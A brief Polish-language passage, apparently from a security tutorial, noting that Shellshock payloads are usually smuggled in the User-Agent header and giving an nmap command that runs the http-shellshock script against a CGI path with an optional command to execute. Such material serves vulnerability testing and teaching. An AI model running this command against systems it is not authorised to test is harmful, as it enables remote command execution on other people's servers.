payload przemycany najczęściej w nagłówku `User-Agent`
```bash
$ nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin[,cmd=ls] <target>
```